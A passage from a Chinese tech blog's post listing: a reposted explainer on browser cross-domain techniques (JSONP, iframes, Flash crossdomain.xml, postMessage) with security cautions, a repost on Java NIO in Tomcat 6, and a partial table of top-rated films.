class="blogstory">这样获得的request对象，就可以向http://def.example.com发送HTTP请求了。</p> <p class="blogstory"><b>（二）完全不同域的跨域技术。</b></p> <p class="blogstory">如果顶级域名都不相同，例如example1.com和example2.com之间想通过JavaScript在前端通信，则所需要的技术更复杂些。</p> <p class="blogstory">在讲解不同域的跨域技术之前，我们首先明确一点，下面要讲的技术也同样适用于前面跨不同子域的情况，因为跨不同子域只是跨域问题的一个特例。当然，在恰当的情况下使用恰当的技术，能够保证更优的效率和更高的稳定性。</p> <p class="blogstory">简言之，根据不同的跨域需求，跨域技术可以归为下面几类：</p> <div class="blogstory"> <ol> <li>JSONP跨域GET请求 </li> <li>通过iframe实现跨域 </li> <li>flash跨域HTTP请求 </li> <li>window.postMessage </li> </ol></div> <p>下面详细介绍各种技术。</p> <p><b>1. JSONP。</b></p> <p>利用在页面中创建&lt;script&gt;节点的方法向不同域提交HTTP请求的方法称为JSONP，这项技术可以解决跨域提交Ajax请求的问题。JSONP的工作原理如下所述：</p> <p>假设在http://example1.com/index.php这个页面中向http://example2.com/getinfo.php提交 GET请求，我们可以将下面的JavaScript代码放在http://example1.com/index.php这个页面中来实现：</p> <p>var eleScript= document.createElement(&quot;script&quot;);</p> <p>eleScript.type = &quot;text/javascript&quot;;</p> <p>eleScript.src = &quot;http://example2.com/getinfo.php&quot;;</p> <p>document.getElementsByTagName(&quot;HEAD&quot;)[0].appendChild(eleScript);</p> <p>当GET请求从http://example2.com/getinfo.php返回时，可以返回一段JavaScript代码，这段代码会自动执行，可以用来负责调用http://example1.com/index.php页面中的一个callback函数。</p> <p>JSONP 的优点是：它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要 XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。</p> <p>JSONP的缺点则是：它只支持GET请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。</p> <p><b>2. 通过iframe实现跨域。</b></p> <p>iframe跨域的方式，功能强于JSONP，它不仅能用来跨域完成HTTP请求，还能在前端跨域实现JavaScript调用。因此，完全不同域的跨域问题，通常采用iframe的方式来解决。</p> <p>与 JSONP技术通过创建&lt;script&gt;节点向不同的域提交GET请求的工作方式类似，我们也可以通过在 http://example1.com/index.php页面中创建指向http://example2.com/getinfo.php的 iframe节点跨域提交GET请求。然而，请求返回的结果无法回调http://example1.com/index.php页面中的 callback函数，因为受到“同源策略”的影响。</p> <p>为了解决这个问题，我们需要在example1.com下放置一个跨域文件，比如路径是http://example1.com/crossdomain.html。</p> <p>当http://example2.com/getinfo.php这个请求返回结果的时候，它大体上有两个选择。</p> <p>第一个选择是，它可以在iframe中做一个302跳转，跳转到跨域文件http://example1.com/crossdomain.html，同时将返回结果经过URL编码之后作为参数缀在跨域文件URL后面，例如http://example1.com /crossdomain.html?result=&lt;URL-Encoding-Content&gt;。</p> <p>另一个选择是，它可以在返回的页面中再嵌入一个iframe，指向跨域文件，同时也是将返回结果经过URL编码之后作为参数缀在跨域文件URL后面。</p> <p>在跨域文件中，包含一段JavaScript代码，这段代码完成的功能，是从URL中提取结果参数，经过一定处理后调用原来的 http://example1.com/index.php页面中的一个预先约定好的callback函数，同时将结果参数传给这个函数。http: //example1.com/index.php页面和跨域文件是在同一个域下的，因此这个函数调用可以通过。跨域文件所在iframe和原来的 http://example1.com/index.php页面的关系，在前述第一种选择下，后者是前者的父窗口，在第二种选择下，后者是前者的父窗口的父窗口。</p> <p>根据前面的叙述，有了跨域文件之后，我们就可以实现通过iframe方式在不同域之间进行JavaScript调用。这个调用过程可以完全跟HTTP请求无关，例如有些站点可以支持动态地调整在页面中嵌入的第三方iframe的高度，这其实是通过在第三方iframe里面检测自己页面的高度变化，然后通过跨域方式的函数调用将这个变化告知父窗口来完成的。</p> <p>既然利用iframe可以实现跨域 JavaScript调用，那么跨域提交POST请求等其它类型的HTTP请求就不是难事。例如我们可以跨域调用目标域的JavaScript代码在目标域下提交Ajax请求（GET/POST/etc.），然后将返回的结果再跨域传原来的域。</p> <p>使用iframe跨域，优点是功能强大，支持各种浏览器，几乎可以完成任何跨域想做的事情；缺点是实现复杂，要处理很多浏览器兼容问题，并且传输的数据不宜过大，过大了可能会超过浏览器对URL长度的限制，要考虑对数据进行分段传输等。</p> <p><b>3. 利用flash实现跨域HTTP请求</b></p> <p>据称，flash在浏览器中的普及率高达90%以上。</p> <p>flash代码和JavaScript代码之间可以互相调用，并且flash的“安全沙箱”机制与JavaScript的安全机制并不尽相同，因此，我们可以利用flash来实现跨域提交HTTP请求（支持GET/POST等）。</p> <p>例如，我们用浏览器访问http://example1.com/index.php这个页面，在这个页面中引用了http://example2.com /flash.swf这个flash文件，然后在flash代码中向http://example3.com/webservice.php发送HTTP 请求。</p> <p>这个请求能否被成功发送，取决于在example3.com的根路径下是否放置了一个crossdomain.xml以及这个 crossdomain.xml的配置如何。flash的“安全沙箱”会保证：仅当example3.com服务器在根路径下确实放置了 crossdomain.xml文件并且在这个文件中配置了允许接受来自example2.com的flash的请求时，这个请求才能真正成功。下面是一个crossdomain.xml文件内容的例子：</p> <p>&lt;?xml version=&quot;1.0&quot;?&gt;</p> <p>&lt;cross-domain-policy&gt;</p> <p>&lt;allow-access-from domain=&quot;example2.com&quot; /&gt;</p> <p>&lt;/cross-domain-policy&gt;</p> <p><b>4. window.postMessage</b></p> <p>window.postMessage是HTML标准的下一个版本<a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/index.html">HTML5</a>支持的一个新特性。受当前互联网技术突飞猛进的影响，浏览器跨域通信的需求越来越强烈，HTML标准终于把跨域通信考虑进去了。但目前HTML5仍然只是一个draft。</p> <p>window.postMessage是一个安全的实现直接跨域通信的方法。但是目前并不是所有浏览器都能支持，只有Firefox 3、Safari 4和IE8可以支持这个调用。</p> <p>使用它向其它窗口发送消息的调用方式大概如下:</p> <p>otherWindow.postMessage(message, targetOrigin);</p> <p>在接收的窗口，需要设置一个事件处理函数来接收发过来的消息：</p> <p>window.addEventListener(&quot;message&quot;, receiveMessage, false);function receiveMessage(event){ if (event.origin!== &quot;http://example.org:8080&quot;) return;}消息包含三个属性：data、origin（携带发送窗口所在域的真实信息）和source（代表发送窗口的handle）。</p> <p>安全性考虑：使用window.postMessage，必需要使用消息的origin和source属性来验证发送者的身份，否则会造成XSS漏洞。</p> <p>window.postMessage在功能上同iframe实现的跨域功能同样强大，并且使用简单，效率更高，但缺点是它目前在浏览器兼容方面有待提高。</p> <p>总结完所有的跨域方式之后，我们要时刻铭记，虽然跨域技术能给你带来更多的功能，催生出更灵活和更加平台化的产品，但是功能的放开也总是意味着安全的风险。在实现跨域技术的每个步骤和细节，都要时刻在头脑中考虑到对安全带来的影响，避免成为XSS攻击的漏洞。</p> <p>&#160;</p> <p><font color="#0000ff">俺在转载基础上，再补充两个实现：</font></p> <p><font color="#0000ff">1、百度在Ajax跨域的时候用了这样的办法：往head里面加一个script src=xxx，因为script标签是可以跨域的。 <br />2、Google的点击计数则这样做：new img().src=...;也跨域了。。。</font></p> <p><font color="#0000ff"></font></p> <p><font color="#0000ff">&#160;</font></p> <p class="read-more">Continue reading <a class="heading" href="/web%E5%89%8D%E7%AB%AF/2011/06/09/e7-96-af-e7-8b-82-e7-9a-84-e8-b7-a8-e5-9f-9f-e6-8a-80-e6-9c-af.html" data-flip="title">【转】疯狂的跨域技术</a></p> </article> <article id="post-java/2011/06/08/%e3%80%90%e8%bd%ac%e3%80%91java-nio%e4%b8%8etomcat-6-%e4%b8%adnio%e7%9a%84%e4%bd%bf%e7%94%a8" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/java/2011/06/08/e3-80-90-e8-bd-ac-e3-80-91java-nio-e4-b8-8etomcat-6-e4-b8-adnio-e7-9a-84-e4-bd-bf-e7-94-a8.html" data-flip="title"> 【转】java nio与tomcat 6 中nio的使用 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-08T20:41:18+08:00">08 Jun 2011</time> in <span>Java</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <p class="MsoNormal"><span lang="ZH-CN">转自</span><span style="font-size: 8pt"><a title="http://jiangyongyuan.iteye.com/blog/361983" href="http://jiangyongyuan.iteye.com/blog/361983">http://jiangyongyuan.iteye.com/blog/361983</a> </span></p> <p class="MsoNormal"> <p>&#160;</p> <p class="MsoNormal"><span lang="ZH-CN">很早就听说</span>tomcat6<span lang="ZH-CN">使用</span>nio<span lang="ZH-CN">了，这几天突然想到一个问题，使用</span>nio<span lang="ZH-CN">代替传统的</span>bio<span lang="ZH-CN">，</span>ThreadLocal<span lang="ZH-CN">岂不是会存在冲突？</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">首先，何谓</span>nio<span lang="ZH-CN">？</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">如果读者有</span>socket<span lang="ZH-CN">的编程基础，应该会接触过堵塞</span>socket<span lang="ZH-CN">和非堵塞</span>socket<span lang="ZH-CN">，堵塞</span>socket<span lang="ZH-CN">就是在</span>accept<span lang="ZH-CN">、</span>read<span lang="ZH-CN">、</span>write<span lang="ZH-CN">等</span> IO<span lang="ZH-CN">操作的的时候，如果没有可用符合条件的资源，不马上返回，一直等待直到有资源为止。而非堵塞</span>socket<span lang="ZH-CN">则是在执行</span>select<span lang="ZH-CN">的时候，当没有资源的时候堵塞，当有符合资源的时候，返回一个信号，然后程序就可以执行</span>accept<span lang="ZH-CN">、</span>read<span lang="ZH-CN">、</span>write<span lang="ZH-CN">等操作，这个时候，这些操作是马上完成，并且马上返回。而</span>windows<span lang="ZH-CN">的</span>winsock<span lang="ZH-CN">则有所不同，可以绑定到一个</span>EventHandle<span lang="ZH-CN">里，也可以绑定到一个</span>HWND<span lang="ZH-CN">里，当有资源到达时，发出事件，这时执行的</span>io<span lang="ZH-CN">操作也是马上完成、马上返回的。一般来说，如果使用堵塞</span>socket<span lang="ZH-CN">，通常我们时开一个线程</span>accept socket<span lang="ZH-CN">，当有</span>socket<span lang="ZH-CN">链接的时候，开一个单独的线程处理这个</span>socket<span lang="ZH-CN">；如果使用非堵塞</span>socket<span lang="ZH-CN">，通常是只有一个线程，一开始是</span> select<span lang="ZH-CN">状态，当有信号的时候马上处理，然后继续</span>select<span lang="ZH-CN">状态。</span> <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">按照大多数人的说法，堵塞</span>socket<span lang="ZH-CN">比非堵塞</span> socket<span lang="ZH-CN">的性能要好。不过也有小部分人并不是这样认为的，例如</span>Indy<span lang="ZH-CN">项目（</span>Delphi<span lang="ZH-CN">一个比较出色的网络包），它就是使用多线程＋堵塞</span> socket<span lang="ZH-CN">模式的。另外，堵塞</span>socket<span lang="ZH-CN">比非堵塞</span>socket<span lang="ZH-CN">容易理解，符合一般人的思维，编程相对比较容易。</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN"></span>nio<span lang="ZH-CN">其实也是类似上面的情况。在</span>JDK1.4<span lang="ZH-CN">，</span>sun<span lang="ZH-CN">公司大范围提升</span>Java<span lang="ZH-CN">的性能，其中</span>NIO<span lang="ZH-CN">就是其中一项。</span>Java<span lang="ZH-CN">的</span>IO<span lang="ZH-CN">操作集中在</span>java.io<span lang="ZH-CN">这个包中，是基于流的阻塞</span>API<span lang="ZH-CN">（即</span>BIO<span lang="ZH-CN">，</span>Block IO<span lang="ZH-CN">）。对于大多数应用来说，这样的</span>API<span lang="ZH-CN">使用很方便，然而，一些对性能要求较高的应用，尤其是服务端应用，往往需要一个更为有效的方式来处理</span>IO<span lang="ZH-CN">。从</span> JDK 1.4<span lang="ZH-CN">起，</span>NIO API<span lang="ZH-CN">作为一个基于缓冲区，并能提供非阻塞</span>O<span lang="ZH-CN">操作的</span>API<span lang="ZH-CN">（即</span>NIO<span lang="ZH-CN">，</span>non-blocking IO<span lang="ZH-CN">）被引入。</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN"></span>BIO<span lang="ZH-CN">与</span>NIO<span lang="ZH-CN">一个比较重要的不同，是我们使用</span>BIO<span lang="ZH-CN">的时候往往会引入多线程，每个连接一个单独的线程；而</span>NIO<span lang="ZH-CN">则是使用单线程或者只使用少量的多线程，每个连接共用一个线程。</span>&#160;&#160; <br /><span lang="ZH-CN"></span>&#160;</p> <p class="MsoNormal"><a href="http://kazge.com/wp-content/uploads/2011/06/clip_image001.jpg"><img style="border-right-width: 0px;border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px" border="0" alt="clip_image001" src="/assets/clip_image001_thumb.jpg" width="459" height="553" /></a></p> <p class="MsoNormal">&#160;</p> <p class="MsoNormal"><span lang="ZH-CN">这个时候，问题就出来了：我们非常多的</span>java<span lang="ZH-CN">应用是使用</span>ThreadLocal<span lang="ZH-CN">的，例如</span>JSF<span lang="ZH-CN">的</span>FaceContext<span lang="ZH-CN">、</span>Hibernate<span lang="ZH-CN">的</span> session<span lang="ZH-CN">管理、</span>Struts2<span lang="ZH-CN">的</span>Context<span lang="ZH-CN">的管理等等，几乎所有框架都或多或少地应用</span>ThreadLocal<span lang="ZH-CN">。如果存在冲突，那岂不惊天动地？</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">后来终于在</span>Tomcat6<span lang="ZH-CN">的文档（</span><a href="http://tomcat.apache.org/tomcat-6.0-doc/aio.html">http://tomcat.apache.org/tomcat-6.0-doc/aio.html</a><span lang="ZH-CN">）找到答案。根据上面说明，应该</span>Tomcat6<span lang="ZH-CN">应用</span>nio<span lang="ZH-CN">只是用在处理发送、接收信息的时候用到，也就是说，</span>tomcat6<span lang="ZH-CN">还是传统的多线程</span>Servlet<span lang="ZH-CN">，我画了下面两个图来列出区别：</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN"></span>tomcat5<span lang="ZH-CN">：客户端连接到达</span> -&gt; <span lang="ZH-CN">传统的</span>SeverSocket.accept<span lang="ZH-CN">接收连接</span> -&gt; <span lang="ZH-CN">从线程池取出一个线程</span> -&gt; <span lang="ZH-CN">在该线程读取文本并且解析</span>HTTP<span lang="ZH-CN">协议</span> -&gt; <span lang="ZH-CN">在该线程生成</span>ServletRequest<span lang="ZH-CN">、</span>ServletResponse<span lang="ZH-CN">，取出请求的</span>Servlet -&gt; <span lang="ZH-CN">在该线程执行这个</span>Servlet -&gt; <span lang="ZH-CN">在该线程把</span>ServletResponse<span lang="ZH-CN">的内容发送到客户端连接</span> -&gt; <span lang="ZH-CN">关闭连接。</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">我以前理解的使用</span>nio<span lang="ZH-CN">后的</span>tomcat6<span lang="ZH-CN">：客户端连接到达</span> -&gt; nio<span lang="ZH-CN">接收连接</span> -&gt; nio<span lang="ZH-CN">使用轮询方式读取文本并且解析</span>HTTP<span lang="ZH-CN">协议（单线程）</span> -&gt; <span lang="ZH-CN">生成</span>ServletRequest<span lang="ZH-CN">、</span>ServletResponse<span lang="ZH-CN">，取出请求的</span>Servlet -&gt; <span lang="ZH-CN">直接在本线程执行这个</span>Servlet -&gt; <span lang="ZH-CN">把</span>ServletResponse<span lang="ZH-CN">的内容发送到客户端连接</span> -&gt; <span lang="ZH-CN">关闭连接。</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">实际的</span>tomcat6<span lang="ZH-CN">：客户端连接到达</span> -&gt; nio<span lang="ZH-CN">接收连接</span> -&gt; nio<span lang="ZH-CN">使用轮询方式读取文本并且解析</span>HTTP<span lang="ZH-CN">协议（单线程）</span> -&gt; <span lang="ZH-CN">生成</span>ServletRequest<span lang="ZH-CN">、</span>ServletResponse<span lang="ZH-CN">，取出请求的</span>Servlet -&gt; <span lang="ZH-CN"><font color="#0000ff">从线程池取出线程，并在该线程执行这个</font></span><span style="color: #0070c0"><font color="#0000ff">Servlet</font> </span>-&gt; <span lang="ZH-CN">把</span>ServletResponse<span lang="ZH-CN">的内容发送到客户端连接</span> -&gt; <span lang="ZH-CN">关闭连接。</span><span lang="ZH-CN"> </span><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">从上图可以看出</span><font color="#0000ff"><span style="color: #0070c0">[</span><span lang="ZH-CN">图在哪里</span><span style="color: #0070c0">?</span><span lang="ZH-CN">作者也是转的？</span><span style="color: #0070c0">]</span></font><span lang="ZH-CN">，</span>BIO<span lang="ZH-CN">与</span>NIO<span lang="ZH-CN">的不同，也导致进入客户端处理线程的时刻有所不同：</span>tomcat5<span lang="ZH-CN">在接受连接后马上进入客户端线程，在客户端线程里解析</span>HTTP<span lang="ZH-CN">协议，而</span>tomcat6<span lang="ZH-CN">则是解析完</span>HTTP<span lang="ZH-CN">协议后才进入多线程，另外，</span>tomcat6<span lang="ZH-CN">也比</span>5<span lang="ZH-CN">早脱离客户端线程的环境。</span>&#160; <br /><span lang="ZH-CN"></span>&#160; <br /><span lang="ZH-CN">实际的</span>tomcat6<span lang="ZH-CN">与我之前猜想的差别主要集中在如何处理</span>servlet<span lang="ZH-CN">的问题上。实际上即使抛开</span> ThreadLocal<span lang="ZH-CN">的问题，我之前理解</span>tomcat6<span lang="ZH-CN">只使用一个线程处理的想法其实是行不同的。大家都有经验：</span>servlet<span lang="ZH-CN">是基于</span>BIO<span lang="ZH-CN">的，执行期间会存在堵塞的，例如读取文件、数据库操作等等。</span>tomcat6<span lang="ZH-CN">使用了</span>nio<span lang="ZH-CN">，但不可能要求</span>servlet<span lang="ZH-CN">里面要使用</span>nio<span lang="ZH-CN">，而一旦存在堵塞，效率自然会锐降。</span></p> <p class="read-more">Continue reading <a class="heading" href="/java/2011/06/08/e3-80-90-e8-bd-ac-e3-80-91java-nio-e4-b8-8etomcat-6-e4-b8-adnio-e7-9a-84-e4-bd-bf-e7-94-a8.html" data-flip="title">【转】java nio与tomcat 6 中nio的使用</a></p> </article> <article id="post-%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/2011/05/30/%e5%b7%a8%e7%89%9b%e7%94%b5%e5%bd%b1%e6%a6%9c" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/2011/05/30/e5-b7-a8-e7-89-9b-e7-94-b5-e5-bd-b1-e6-a6-9c.html" data-flip="title"> 巨牛电影榜 </a> </h1> <p class="post-date heading"> <time datetime="2011-05-30T17:03:23+08:00">30 May 2011</time> in <span>默认分类</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <table style="width: 333pt;border-collapse: collapse" border="0" cellspacing="0" cellpadding="0" width="444"> <col style="width: 50pt" width="66" /> <col style="width: 182pt" width="243" /> <col style="width: 48pt" width="64" /> <col style="width: 53pt" width="71" /> <tbody> <tr style="height: 12.75pt"> <td style="width: 50pt;height: 12.75pt" class="xl63" height="17" width="66">榜位</td> <td style="width: 182pt" class="xl63" width="243">名称</td> <td style="width: 48pt" class="xl64" width="64">观看人数</td> <td style="width: 53pt" class="xl64" width="71">评分</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">1</td> <td class="xl65">The Shawshank Redemption</td> <td class="xl66" align="right">280434</td> <td class="xl66" align="right">95</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">2</td> <td class="xl65">Forrest Gump</td> <td class="xl66" align="right">254395</td> <td class="xl66" align="right">93</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">3</td> <td class="xl65">Léon</td> <td class="xl66" align="right">253968</td> <td class="xl66" align="right">94</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">4</td> <td class="xl65">Titanic</td> <td class="xl66" align="right">219804</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">5</td> <td class="xl65">La leggenda del pianista sull'oceano</td> <td class="xl66" align="right">217189</td> <td class="xl66" align="right">92</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">6</td> <td class="xl65">Le fabuleux destin d'Amélie Poulain</td> <td class="xl66" align="right">191494</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">7</td> <td class="xl65">Edward Scissorhands</td> <td class="xl66" align="right">180041</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">8</td> <td class="xl65">Roman Holiday</td> <td class="xl66" align="right">148918</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">9</td> <td class="xl65">Love Letter</td> <td class="xl66" align="right">142698</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">10</td> <td class="xl65">Braveheart</td> <td class="xl66" align="right">126816</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">11</td> <td class="xl65">Jeux d'enfants</td> <td class="xl66" align="right">125365</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">12</td> <td class="xl65">The Butterfly Effect</td> <td class="xl66" align="right">122963</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">13</td> <td class="xl65">The Truman Show</td> <td class="xl66" align="right">122006</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">14</td> <td class="xl65">Fight Club</td> <td class="xl66" align="right">120462</td> <td class="xl66" align="right">91</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">15</td> <td class="xl65">La vita è bella</td> <td class="xl66" align="right">120219</td> <td class="xl66" align="right">94</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">16</td> <td class="xl63">无间道</td> <td class="xl66" align="right">118713</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">17</td> <td class="xl65">The Silence of the Lambs</td> <td class="xl66" align="right">114312</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">18</td> <td class="xl63">西游记大结局之仙履奇缘</td> <td class="xl66" align="right">113054</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">19</td> <td class="xl65">Love Actually</td> <td class="xl66" align="right">111173</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">20</td> <td class="xl65">The Lion King</td> <td class="xl66" align="right">107942</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">21</td> <td class="xl63">重庆森林</td> <td class="xl66" align="right">103985</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">22</td> <td class="xl63">ハウルの動く城</td> <td class="xl66" align="right">101805</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">23</td> <td class="xl65">Scent of a Woman</td> <td class="xl66" align="right">101559</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">24</td> <td class="xl63">西游记第一百零一回之月光宝盒</td> <td class="xl66" align="right">100752</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">25</td> <td class="xl65">Trainspotting</td> <td class="xl66" align="right">99836</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">26</td> <td class="xl63">東邪西毒</td> <td class="xl66" align="right">98840</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">27</td> <td class="xl65">Malèna</td> <td class="xl66" align="right">98331</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">28</td> <td class="xl65">Gone with the Wind</td> <td class="xl66" align="right">97588</td> <td class="xl66" align="right">92</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">29</td> <td class="xl65">A Beautiful Mind</td> <td class="xl66" align="right">93386</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">30</td> <td class="xl65">The Sound of Music</td> <td class="xl66" align="right">91506</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">31</td> <td class="xl63">射雕英雄传之东成西就</td> <td class="xl66" align="right">89548</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">32</td> <td class="xl63">甜蜜蜜</td> <td class="xl66" align="right">85088</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">33</td> <td class="xl65">Memento</td> <td class="xl66" align="right">82271</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">34</td> <td class="xl63">もののけ姫</td> <td class="xl66" align="right">82256</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">35</td> <td class="xl65">Saving Private Ryan</td> <td class="xl66" align="right">77090</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">36</td> <td class="xl65">The Notebook</td> <td class="xl66" align="right">77089</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">37</td> <td class="xl65">Lock, Stock and Two Smoking Barrels</td> <td class="xl66" align="right">76242</td> <td class="xl66" align="right">91</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">38</td> <td class="xl63">火垂るの墓</td> <td class="xl66" align="right">75885</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">39</td> <td class="xl65">Good Will Hunting</td> <td class="xl66" align="right">75468</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">40</td> <td class="xl65">The Sixth Sense</td> <td class="xl66" align="right">72079</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">41</td> <td class="xl63">活着</td> <td class="xl66" align="right">71662</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">42</td> <td class="xl63">春光乍洩</td> <td class="xl66" align="right">68931</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">43</td> <td class="xl65">The Pianist</td> <td class="xl66" align="right">63930</td> <td class="xl66" align="right">89</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">44</td> <td class="xl65">Artificial Intelligence: AI</td> <td class="xl66" align="right">63559</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">45</td> <td class="xl65">Legends of the Fall</td> <td class="xl66" align="right">60750</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">46</td> <td class="xl65">Mulholland Dr.</td> <td class="xl66" align="right">58357</td> <td class="xl66" align="right">86</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">47</td> <td class="xl65">Sin City</td> <td class="xl66" align="right">57921</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">48</td> <td class="xl65">Before Sunset</td> <td class="xl66" align="right">57451</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">49</td> <td class="xl65">E.T. the Extra-Terrestrial</td> <td class="xl66" align="right">56747</td> <td class="xl66" align="right">85</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">50</td> <td class="xl65">Waterloo Bridge</td> <td class="xl66" align="right">56072</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">51</td> <td class="xl65">The Godfather: Part II</td> <td class="xl66" align="right">55621</td> <td class="xl66" align="right">90</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">52</td> <td class="xl65">Before Sunrise</td> <td class="xl66" align="right">55352</td> <td class="xl66" align="right">88</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">53</td> <td class="xl63">スワロウテイル</td> <td class="xl66" align="right">53273</td> <td class="xl66" align="right">87</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">54</td> <td class="xl63">麦兜故事</td> <td class="xl66" align="right">52592</td> <td 